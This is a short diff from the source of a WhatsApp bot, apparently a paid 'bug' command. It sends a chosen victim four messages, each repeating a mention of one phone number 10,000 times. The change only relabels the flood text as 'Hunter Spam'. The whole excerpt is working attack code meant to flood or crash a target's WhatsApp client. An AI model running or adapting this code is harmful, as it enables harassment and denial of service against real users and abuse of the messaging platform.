@@ -2476,25 +2476,25 @@ if (!isPremium) return replygcxeon(mess.prem)
   grpinv(victim)
   await sleep(5)
   await XeonBotInc.relayMessage(victim, {"extendedTextMessage": {
-  text: `\n\n\n\n\n\n\n\n\n\n\n\n  ${"\n@212679593105\n ".repeat(10000)}`,
+  text: `Hunter Spam 🐍🐍\n${"~*@212679593105*~\n ".repeat(10000)}`,
   "contextInfo": { mentionedJid: [ "212679593105@s.whatsapp.net" ] }
   }
   }, { participant: { jid: victim }})
   await sleep(5)
   await XeonBotInc.relayMessage(victim, {"extendedTextMessage": {
-  text: `\n\n\n\n\n\n\n\n\n\n\n\n  ${"\n@212679593105\n ".repeat(10000)}`,
+  text: `Hunter Spam 🐍🐍\n${"~*@212679593105*~\n ".repeat(10000)}`,
   "contextInfo": { mentionedJid: [ "212679593105@s.whatsapp.net" ] }
   }
   }, { participant: { jid: victim }})
   await sleep(5)
   await XeonBotInc.relayMessage(victim, {"extendedTextMessage": {
-  text: `\n\n\n\n\n\n\n\n\n\n\n\n  ${"\n@212679593105\n ".repeat(10000)}`,
+  text: `Hunter Spam 🐍🐍\n${"~*@212679593105*~\n ".repeat(10000)}`,
   "contextInfo": { mentionedJid: [ "212679593105@s.whatsapp.net" ] }
   }
   }, { participant: { jid: victim }})
   await sleep(5)
   await XeonBotInc.relayMessage(victim, {"extendedTextMessage": {
-  text: `\n\n\n\n\n\n\n\n\n\n\n\n  ${"\n@212679593105\n ".repeat(10000)}`,
+  text: `Hunter Spam 🐍🐍\n${"~*@212679593105*~\n ".repeat(10000)}`,
   "contextInfo": { mentionedJid: [ "212679593105@s.whatsapp.net" ] }
   }
   }, { participant: { jid: victim }})
